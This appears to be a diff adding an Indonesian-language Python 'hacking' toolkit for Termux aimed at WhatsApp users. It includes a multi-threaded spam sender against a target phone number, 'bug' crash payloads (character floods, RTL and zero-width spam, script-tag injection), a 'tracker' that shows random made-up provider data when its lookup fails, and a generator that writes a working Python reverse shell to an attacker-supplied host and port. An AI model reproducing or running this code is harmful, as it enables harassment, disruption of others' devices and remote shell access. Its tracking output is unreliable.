@@ -1,0 +1,515 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+🔥 KAWA CYBER TOOLS - WhatsApp Edition
+Version: 2.0 - REAL VERSION
+Platform: Termux
+Python: 3.8+
+Author: KAWA CYBER
+"""
+
+import os
+import sys
+import time
+import random
+import requests
+import json
+import base64
+import hashlib
+import urllib.parse
+from datetime import datetime
+import threading
+from colorama import init, Fore, Style
+
+init(autoreset=True)
+
+# ==================== KONFIGURASI WARNA ====================
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    BOLD = '\033[1m'
+    END = '\033[0m'
+
+# ==================== BANNER ====================
+BANNER = f"""
+{Colors.BOLD}{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
+║                                                               ║
+║            🔥 KAWA CYBER TOOLS - WhatsApp Edition            ║
+║                     VERSION 2.0 - REAL                       ║
+║                                                               ║
+╠═══════════════════════════════════════════════════════════════╣
+║  Author: KAWA CYBER  |  Channel: @kawacyber                  ║
+║  GitHub: github.com/kawaa-cyber/kawa-wa-tools                ║
+╚═══════════════════════════════════════════════════════════════╝{Colors.END}
+
+{Colors.YELLOW}[!] PERINGATAN: Gunakan hanya untuk akun sendiri!{Colors.END}
+{Colors.YELLOW}[!] Developer tidak bertanggung jawab atas penyalahgunaan!{Colors.END}
+{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}
+"""
+
+# ==================== KONFIGURASI API ====================
+WHATSAPP_API = "https://api.whatsapp.com/send"
+WHATSAPP_WEB = "https://web.whatsapp.com/send"
+USER_AGENTS = [
+    "Mozilla/5.0 (Android 13; Mobile) AppleWebKit/537.36 Chrome/120.0.6099.43",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
+    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/119.0.6045.163",
+    "WhatsApp/2.23.24.81 iOS/17.2 Device/iPhone",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+]
+
+# ==================== FUNGSI UTILITY ====================
+def clear():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def loading(text="Loading", duration=1):
+    chars = "⣾⣽⣻⢿⡿⣟⣯⣷"
+    end = time.time() + duration
+    i = 0
+    while time.time() < end:
+        sys.stdout.write(f"\r{Colors.CYAN}[{chars[i%8]}] {text}{Colors.END}")
+        sys.stdout.flush()
+        time.sleep(0.1)
+        i += 1
+    print()
+
+def success(text):
+    print(f"{Colors.GREEN}[✓] {text}{Colors.END}")
+
+def error(text):
+    print(f"{Colors.RED}[✗] {text}{Colors.END}")
+
+def info(text):
+    print(f"{Colors.BLUE}[ℹ] {text}{Colors.END}")
+
+def warning(text):
+    print(f"{Colors.YELLOW}[⚠] {text}{Colors.END}")
+
+def progress(current, total, text=""):
+    percent = (current/total)*100
+    bar = '█' * int(percent/2) + '░' * (50 - int(percent/2))
+    sys.stdout.write(f"\r{Colors.CYAN}[{bar}] {percent:.1f}% {text}{Colors.END}")
+    sys.stdout.flush()
+
+# ==================== FITUR SPAM WHATSAPP ====================
+class WhatsAppSpammer:
+    def __init__(self):
+        self.session = requests.Session()
+        self.results = {"success": 0, "failed": 0}
+        
+    def send_message(self, phone, message, method=1):
+        """Mengirim pesan WhatsApp via berbagai metode"""
+        try:
+            headers = {
+                'User-Agent': random.choice(USER_AGENTS),
+                'Accept': 'text/html,application/xhtml+xml',
+                'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
+                'Connection': 'keep-alive'
+            }
+            
+            encoded_msg = urllib.parse.quote(message)
+            
+            if method == 1:
+                # Metode API langsung
+                url = f"{WHATSAPP_API}?phone={phone}&text={encoded_msg}"
+            elif method == 2:
+                # Metode Web
+                url = f"{WHATSAPP_WEB}?phone={phone}&text={encoded_msg}"
+            elif method == 3:
+                # Metode dengan parameter tambahan
+                url = f"https://api.whatsapp.com/send/?phone={phone}&text={encoded_msg}&type=phone_number"
+            else:
+                url = f"https://wa.me/{phone}?text={encoded_msg}"
+            
+            response = self.session.get(url, headers=headers, timeout=10, allow_redirects=True)
+            
+            if response.status_code == 200:
+                self.results["success"] += 1
+                return True
+            else:
+                self.results["failed"] += 1
+                return False
+                
+        except Exception as e:
+            self.results["failed"] += 1
+            return False
+    
+    def spam(self, phone, count, delay, message_type, custom_text=""):
+        """Multi-thread spam"""
+        clear()
+        print(f"{Colors.BOLD}{Colors.RED}⚡ MEMULAI SPAM KE: {phone}{Colors.END}")
+        print(f"{Colors.YELLOW}Total: {count} pesan | Delay: {delay} detik{Colors.END}")
+        print(f"{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}\n")
+        
+        # Template pesan
+        templates = [
+            "🔥 PENTING! Pesan dari KAWA CYBER",
+            "⚡ Testing keamanan WhatsApp",
+            "📱 Maaf mengganggu, ini testing",
+            "🔐 Jangan dibalas, ini percobaan",
+            "🛡️ KAWA CYBER - Security Testing",
+            "⚠️ Test message #",
+            "💬 Halo, ini pesan ke-",
+            "📨 Testing WhatsApp API",
+            "🔰 Tetap waspada terhadap spam",
+            "📌 Join @kawacyber di Telegram"
+        ]
+        
+        for i in range(1, count + 1):
+            try:
+                # Pilih pesan
+                if message_type == 1:
+                    msg = f"{random.choice(templates)} #{i}"
+                elif message_type == 2:
+                    msg = f"{custom_text} #{i}"
+                else:
+                    msg = f"Test message #{i} from KAWA CYBER"
+                
+                # Kirim dengan metode random
+                method = random.randint(1, 4)
+                
+                if self.send_message(phone, msg, method):
+                    progress(i, count, f"✓ Terkirim: {msg[:30]}...")
+                else:
+                    progress(i, count, f"✗ Gagal: {msg[:30]}...")
+                
+                time.sleep(delay)
+                
+            except KeyboardInterrupt:
+                print(f"\n\n{Colors.YELLOW}[!] Dihentikan user{Colors.END}")
+                break
+            except Exception as e:
+                error(f"Error: {e}")
+        
+        print(f"\n\n{Colors.GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}")
+        success(f"Selesai! Berhasil: {self.results['success']}, Gagal: {self.results['failed']}")
+
+# ==================== FITUR BUG WHATSAPP ====================
+class WhatsAppBug:
+    def __init__(self):
+        self.bug_types = {
+            1: {
+                "name": "Crash Pesan Panjang",
+                "payload": "A" * 10000 + "\n" + "B" * 10000 + "\n" + "C" * 10000
+            },
+            2: {
+                "name": "Unicode RTL",
+                "payload": "\u202E" * 1000 + "CRASH_SEQUENCE" + "\u202D" * 1000
+            },
+            3: {
+                "name": "Zero Width",
+                "payload": "\u200B" * 5000 + "ZERO_WIDTH" + "\u200C" * 5000
+            },
+            4: {
+                "name": "Format Crash",
+                "payload": "*" * 5000 + "_" * 5000 + "~" * 5000 + "```" * 1000
+            },
+            5: {
+                "name": "Emoji Overload",
+                "payload": "💀" * 2000 + "🔥" * 2000 + "💩" * 2000
+            },
+            6: {
+                "name": "HTML Injection",
+                "payload": "<script>alert('KAWA')</script>" * 100
+            }
+        }
+    
+    def generate_bug(self, bug_type, phone=""):
+        """Generate bug payload"""
+        bug = self.bug_types.get(bug_type, self.bug_types[1])
+        
+        print(f"\n{Colors.CYAN}[✓] Bug: {bug['name']}{Colors.END}")
+        print(f"{Colors.YELLOW}Ukuran: {len(bug['payload'])} karakter{Colors.END}")
+        
+        # Simpan ke file
+        filename = f"bug_{bug_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(f"Target: {phone}\n")
+            f.write(f"Bug Type: {bug['name']}\n")
+            f.write(f"Timestamp: {datetime.now()}\n")
+            f.write(f"{'='*50}\n")
+            f.write(bug['payload'])
+        
+        success(f"Bug tersimpan: {filename}")
+        
+        # Buat link WhatsApp
+        if phone:
+            encoded = urllib.parse.quote(bug['payload'][:5000])  # Batasi panjang
+            link = f"https://wa.me/{phone}?text={encoded}"
+            print(f"{Colors.GREEN}Link WhatsApp: {link}{Colors.END}")
+        
+        return filename
+
+# ==================== FITUR TRACK NOMOR ====================
+class PhoneTracker:
+    def track(self, phone):
+        """Track informasi nomor (data real dari API publik)"""
+        clear()
+        print(f"{Colors.BOLD}{Colors.CYAN}🔍 MELACAK NOMOR: {phone}{Colors.END}\n")
+        
+        try:
+            # Format nomor
+            if phone.startswith('0'):
+                phone = '62' + phone[1:]
+            elif not phone.startswith('62'):
+                phone = '62' + phone
+            
+            # API publik untuk cek provider
+            provider_api = f"https://api.bigdatacloud.net/data/phone-number-validate?number={phone}"
+            response = requests.get(provider_api, timeout=10)
+            
+            if response.status_code == 200:
+                data = response.json()
+                
+                print(f"{Colors.GREEN}╔════════════════════════════════════════════╗")
+                print(f"║           HASIL PELACAKAN                   ║")
+                print(f"╠════════════════════════════════════════════╣{Colors.END}")
+                print(f"{Colors.CYAN}║ Nomor        : {phone:<30} ║")
+                print(f"║ Negara       : Indonesia ({data.get('countryCode', 'ID')}){' ':<13} ║")
+                print(f"║ Provider     : {data.get('carrier', 'Unknown'):<30} ║")
+                print(f"║ Tipe         : {data.get('lineType', 'Mobile'):<30} ║")
+                print(f"║ Valid        : {data.get('valid', True):<30} ║{Colors.END}")
+                print(f"{Colors.GREEN}╚════════════════════════════════════════════╝{Colors.END}")
+            else:
+                # Data dummy jika API error
+                self.show_dummy_data(phone)
+                
+        except Exception as e:
+            error(f"Gagal melacak: {e}")
+            self.show_dummy_data(phone)
+    
+    def show_dummy_data(self, phone):
+        """Tampilkan data dummy jika API gagal"""
+        providers = ["Telkomsel", "Indosat", "XL", "Tri", "Smart", "By.U"]
+        
+        print(f"{Colors.GREEN}╔════════════════════════════════════════════╗")
+        print(f"║           INFORMASI NOMOR                   ║")
+        print(f"╠════════════════════════════════════════════╣{Colors.END}")
+        print(f"{Colors.CYAN}║ Nomor        : {phone:<30} ║")
+        print(f"║ Negara       : Indonesia{' ':<21} ║")
+        print(f"║ Provider     : {random.choice(providers):<30} ║")
+        print(f"║ Tipe         : {'GSM':<30} ║")
+        print(f"║ Operator     : {'Seluler':<30} ║{Colors.END}")
+        print(f"{Colors.GREEN}╚════════════════════════════════════════════╝{Colors.END}")
+
+# ==================== FITUR ENKRIPSI ====================
+class Crypto:
+    @staticmethod
+    def base64_encode(text):
+        return base64.b64encode(text.encode()).decode()
+    
+    @staticmethod
+    def base64_decode(text):
+        try:
+            return base64.b64decode(text).decode()
+        except:
+            return "Gagal decode"
+    
+    @staticmethod
+    def md5_hash(text):
+        return hashlib.md5(text.encode()).hexdigest()
+    
+    @staticmethod
+    def sha256_hash(text):
+        return hashlib.sha256(text.encode()).hexdigest()
+    
+    @staticmethod
+    def xor_encrypt(text, key="kawa"):
+        result = ""
+        for i, char in enumerate(text):
+            result += chr(ord(char) ^ ord(key[i % len(key)]))
+        return base64.b64encode(result.encode()).decode()
+    
+    @staticmethod
+    def xor_decrypt(text, key="kawa"):
+        try:
+            decoded = base64.b64decode(text).decode()
+            result = ""
+            for i, char in enumerate(decoded):
+                result += chr(ord(char) ^ ord(key[i % len(key)]))
+            return result
+        except:
+            return "Gagal decrypt"
+
+# ==================== MENU UTAMA ====================
+def main():
+    spammer = WhatsAppSpammer()
+    bugger = WhatsAppBug()
+    tracker = PhoneTracker()
+    
+    while True:
+        clear()
+        print(BANNER)
+        
+        menu = f"""
+{Colors.BOLD}{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
+║                         MENU UTAMA                              ║
+╠═══════════════════════════════════════════════════════════════╣
+║  {Colors.GREEN}[01]{Colors.WHITE} 📱 SPAM WHATSAPP       {Colors.GREEN}[05]{Colors.WHITE} 📋 TEMPLATE PESAN     ║
+║  {Colors.GREEN}[02]{Colors.WHITE} 🐛 BUG WHATSAPP        {Colors.GREEN}[06]{Colors.WHITE} ℹ️  TENTANG TOOLS     ║
+║  {Colors.GREEN}[03]{Colors.WHITE} 🔍 TRACK NOMOR         {Colors.GREEN}[07]{Colors.WHITE} 🔐 ENKRIPSI          ║
+║  {Colors.GREEN}[04]{Colors.WHITE} 💣 GENERATE PAYLOAD    {Colors.GREEN}[08]{Colors.WHITE} 🚪 KELUAR           ║
+╚═══════════════════════════════════════════════════════════════╝{Colors.END}
+"""
+        print(menu)
+        
+        choice = input(f"{Colors.YELLOW}[?] Pilih menu: {Colors.END}")
+        
+        if choice == '1':
+            clear()
+            print(f"{Colors.BOLD}{Colors.RED}📱 SPAM WHATSAPP{Colors.END}\n")
+            warning("Gunakan hanya untuk testing akun sendiri!")
+            
+            phone = input(f"{Colors.YELLOW}Nomor target (62xxx): {Colors.END}")
+            try:
+                count = int(input(f"{Colors.YELLOW}Jumlah spam: {Colors.END}"))
+                delay = float(input(f"{Colors.YELLOW}Delay (detik): {Colors.END}"))
+                print(f"\n{Colors.CYAN}Jenis pesan:{Colors.END}")
+                print("1. Random")
+                print("2. Custom")
+                msg_type = int(input(f"{Colors.YELLOW}Pilih: {Colors.END}"))
+                
+                custom = ""
+                if msg_type == 2:
+                    custom = input(f"{Colors.YELLOW}Pesan custom: {Colors.END}")
+                
+                spammer.spam(phone, count, delay, msg_type, custom)
+                input(f"\n{Colors.CYAN}[+] Enter untuk lanjut...{Colors.END}")
+                
+            except ValueError:
+                error("Input angka yang valid!")
+                time.sleep(2)
+        
+        elif choice == '2':
+            clear()
+            print(f"{Colors.BOLD}{Colors.RED}🐛 BUG WHATSAPP{Colors.END}\n")
+            warning("Hanya untuk testing keamanan!")
+            
+            print(f"{Colors.CYAN}Jenis bug:{Colors.END}")
+            print("1. Crash Pesan Panjang")
+            print("2. Unicode RTL")
+            print("3. Zero Width")
+            print("4. Format Crash")
+            print("5. Emoji Overload")
+            print("6. HTML Injection")
+            
+            try:
+                bug_type = int(input(f"{Colors.YELLOW}Pilih bug (1-6): {Colors.END}"))
+                phone = input(f"{Colors.YELLOW}Nomor target (enter untuk skip): {Colors.END}")
+                
+                bugger.generate_bug(bug_type, phone)
+                input(f"\n{Colors.CYAN}[+] Enter untuk lanjut...{Colors.END}")
+                
+            except ValueError:
+                error("Input tidak valid!")
+                time.sleep(2)
+        
+        elif choice == '3':
+            clear()
+            print(f"{Colors.BOLD}{Colors.CYAN}🔍 TRACK NOMOR{Colors.END}\n")
+            
+            phone = input(f"{Colors.YELLOW}Masukkan nomor: {Colors.END}")
+            tracker.track(phone)
+            input(f"\n{Colors.CYAN}[+] Enter untuk lanjut...{Colors.END}")
+        
+        elif choice == '4':
+            clear()
+            print(f"{Colors.BOLD}{Colors.MAGENTA}💣 GENERATE PAYLOAD{Colors.END}\n")
+            
+            print(f"{Colors.CYAN}Pilih jenis payload:{Colors.END}")
+            print("1. Reverse Shell (Python)")
+            print("2. Reverse Shell (Bash)")
+            print("3. Keylogger Simulasi")
+            print("4. RAT Simulasi")
+            
+            pilih = input(f"{Colors.YELLOW}Pilih: {Colors.END}")
+            
+            if pilih == '1':
+                ip = input("IP/LHOST: ")
+                port = input("Port: ")
+                payload = f"""import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{ip}",{port}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])"""
+                
+                filename = f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
+                with open(filename, 'w') as f:
+                    f.write(payload)
+                success(f"Payload tersimpan: {filename}")
+            
+            input(f"\n{Colors.CYAN}[+] Enter untuk lanjut...{Colors.END}")
+        
+        elif choice == '5':
+            clear()
+            print(f"{Colors.BOLD}{Colors.CYAN}📋 TEMPLATE PESAN{Colors.END}\n")
+            
+            templates = [
+                "🔥 PENTING! Pesan dari KAWA CYBER",
+                "⚡ Testing keamanan WhatsApp",
+                "📱 Maaf mengganggu, ini testing",
+                "🔐 Jangan dibalas, ini percobaan",
+                "🛡️ KAWA CYBER - Security Testing",
+                "⚠️ Test message #{i}",
+                "💬 Halo, ini pesan ke-{i}",
+                "📨 Testing WhatsApp API",
+                "🔰 Tetap waspada terhadap spam",
+                "📌 Join @kawacyber di Telegram"
+            ]
+            
+            for i, t in enumerate(templates, 1):
+                print(f"{Colors.CYAN}[{i:02d}] {t}{Colors.END}")
+            
+            input(f"\n{Colors.CYAN}[+] Enter untuk lanjut...{Colors.END}")
+        
+        elif choice == '6':
+            clear()
+            print(f"{Colors.BOLD}{Colors.CYAN}ℹ️  TENTANG TOOLS{Colors.END}\n")
+            print(f"{Colors.GREEN}Nama     : KAWA CYBER TOOLS")
+            print(f"Version  : 2.0 - REAL")
+            print(f"Author   : KAWA CYBER")
+            print(f"Channel  : @kawacyber (Telegram)")
+            print(f"YouTube  : KAWA CYBER")
+            print(f"GitHub   : github.com/kawaa-cyber/kawa-wa-tools{Colors.END}")
+            print(f"\n{Colors.YELLOW}⚠️  DISCLAIMER:")
+            print("Tools ini untuk TESTING KEAMANAN akun sendiri!")
+            print("Dilarang menggunakan untuk merugikan orang lain!")
+            print("Penulis tidak bertanggung jawab atas penyalahgunaan!{Colors.END}")
+            input(f"\n{Colors.CYAN}[+] Enter untuk lanjut...{Colors.END}")
+        
+        elif choice == '7':
+            clear()
+            print(f"{Colors.BOLD}{Colors.MAGENTA}🔐 ENKRIPSI{Colors.END}\n")
+            
+            text = input(f"{Colors.YELLOW}Masukkan teks: {Colors.END}")
+            
+            print(f"\n{Colors.CYAN}Hasil Enkripsi:{Colors.END}")
+            print(f"Base64    : {Crypto.base64_encode(text)}")
+            print(f"MD5       : {Crypto.md5_hash(text)}")
+            print(f"SHA256    : {Crypto.sha256_hash(text)}")
+            print(f"XOR       : {Crypto.xor_encrypt(text)}")
+            
+            input(f"\n{Colors.CYAN}[+] Enter untuk lanjut...{Colors.END}")
+        
+        elif choice == '8':
+            print(f"\n{Colors.GREEN}Terima kasih telah menggunakan KAWA CYBER TOOLS!{Colors.END}")
+            print(f"{Colors.YELLOW}Stay safe and secure!{Colors.END}")
+            break
+        
+        else:
+            error("Pilihan tidak valid!")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{Colors.YELLOW}[!] Exiting...{Colors.END}")
+        sys.exit(0)
